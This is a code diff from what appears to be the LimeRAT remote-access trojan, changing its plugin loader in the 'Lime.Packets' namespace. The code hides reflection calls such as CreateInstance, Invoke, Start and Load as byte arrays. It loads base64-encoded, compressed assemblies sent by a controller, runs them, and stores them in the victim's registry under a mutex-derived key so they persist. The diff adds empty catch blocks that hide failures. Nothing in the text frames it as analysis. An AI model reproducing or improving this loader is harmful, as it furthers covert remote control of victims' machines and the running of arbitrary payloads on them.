@@ -64,41 +64,52 @@ namespace Lime.Packets
             }
             catch
             {
-                Client.isConnected = false;
+                //Client.isConnected = false;
             }
         }
 
         public void Invoke(string H, string P, string N, string C, string ID, string Bytes, int S, bool M, string MD5, bool B) //invoke plugin function
         {
-            byte[] ci = new byte[] { 67, 114, 101, 97, 116, 101, 73, 110, 115, 116, 97, 110, 99, 101 };
-            byte[] gem = new byte[] { 71, 101, 116, 77, 101, 116, 104, 111, 100 };
-            byte[] invo = new byte[] { 73, 110, 118, 111, 107, 101 };
-            byte[] vod = new byte[] { 83, 116, 97, 114, 116 };
-            object ar = Interaction.CallByName(GetAssembly(Bytes), Encoding.Default.GetString(ci), CallType.Method, N + "." + C);
-            object inn = Interaction.CallByName(ar, Encoding.Default.GetString(vod), CallType.Method, new object[] { ID, S, H, P, Config.key, Config.splitter });
-            if (M)
+            try
             {
-                try
+                byte[] ci = new byte[] { 67, 114, 101, 97, 116, 101, 73, 110, 115, 116, 97, 110, 99, 101 };
+                byte[] gem = new byte[] { 71, 101, 116, 77, 101, 116, 104, 111, 100 };
+                byte[] invo = new byte[] { 73, 110, 118, 111, 107, 101 };
+                byte[] vod = new byte[] { 83, 116, 97, 114, 116 };
+                object ar = Interaction.CallByName(GetAssembly(Bytes), Encoding.Default.GetString(ci), CallType.Method, N + "." + C);
+                object inn = Interaction.CallByName(ar, Encoding.Default.GetString(vod), CallType.Method, new object[] { ID, S, H, P, Config.key, Config.splitter });
+                if (M)
                 {
-                    if (Registry.CurrentUser.OpenSubKey("Software\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, true) == null)
+                    try
+                    {
+                        if (Registry.CurrentUser.OpenSubKey("Software\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, true) == null)
+                        {
+                            SavePlugin("HKEY_CURRENT_USER\\SOFTWARE\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, MD5, Bytes);
+                        }
+                    }
+                    catch
+                    {
+                    }
+                    if (B == false)
                     {
                         SavePlugin("HKEY_CURRENT_USER\\SOFTWARE\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, MD5, Bytes);
                     }
                 }
-                catch
-                {
-                }
-                if (B == false)
-                {
-                    SavePlugin("HKEY_CURRENT_USER\\SOFTWARE\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, MD5, Bytes);
-                }
             }
+            catch { }
         }
         public object GetAssembly(string bytesArray) //load assembly
         {
-            byte[] lod = new byte[] { 76, 111, 97, 100 };
-            object ap = AppDomain.CurrentDomain;
-            return Interaction.CallByName(ap, Encoding.Default.GetString(lod), CallType.Method, StringConverter.Decompress(Convert.FromBase64String(bytesArray)));
+            try
+            {
+
+                byte[] lod = new byte[] { 76, 111, 97, 100 };
+                object ap = AppDomain.CurrentDomain;
+                return Interaction.CallByName(ap, Encoding.Default.GetString(lod), CallType.Method, StringConverter.Decompress(Convert.FromBase64String(bytesArray)));
+
+            }
+            catch { }
+            return null;
         }
 
         public void SavePlugin(string P, string N, string B) //add reg value
